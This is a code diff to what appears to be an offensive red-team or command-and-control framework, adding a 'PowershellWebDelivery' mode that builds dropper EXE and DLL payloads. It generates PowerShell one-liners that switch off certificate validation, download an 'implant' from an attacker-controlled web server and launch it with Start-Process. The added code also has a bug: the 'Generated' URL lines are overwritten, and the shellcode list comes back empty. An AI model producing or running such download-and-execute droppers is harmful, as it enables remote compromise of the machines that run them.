@@ -48,6 +48,40 @@ def printCiphertext(ciphertext):
 	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'
 
 
+def getHelpExploration():
+        helpMessage = 'PowershellWebDelivery generate a powershell one liner to download and execute a payload from a web server\n'
+        helpMessage += 'Usage:  Dropper PowershellWebDelivery listenerDownload listenerBeacon\n'
+        return helpMessage
+
+
+def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):
+
+        if url[-1:] == "/":
+                url = url[:-1]
+
+        droppersPath = []
+        shellcodesPath = []
+        dropperExePath, dropperDllPath = generatePayloads(binary, binaryArgs, rawShellCode)
+
+        droppersPath.append(dropperExePath)
+        droppersPath.append(dropperDllPath)
+
+        implantExeUrl = url + "/implant.exe"
+        implantDllUrl = url + "/implant.dll"
+        oneliner  = "Generated:\n"
+        oneliner += implantExeUrl + "\n"
+        oneliner += implantDllUrl + "\n"
+        oneliner  = "Possible cmd:\n"
+        oneliner += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('"
+        oneliner += implantExeUrl
+        oneliner += "',(Get-Location).Path+'\\test.exe'); Start-Process test.exe;\n"
+        oneliner += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('"
+        oneliner += implantDllUrl
+        oneliner += "',(Get-Location).Path+'\\test.dll');\n"
+
+        return droppersPath, shellcodesPath, oneliner
+
+
 def generatePayloads(binary, binaryArgs, rawShellCode):
         if binary:
                 print('binary ', binary)
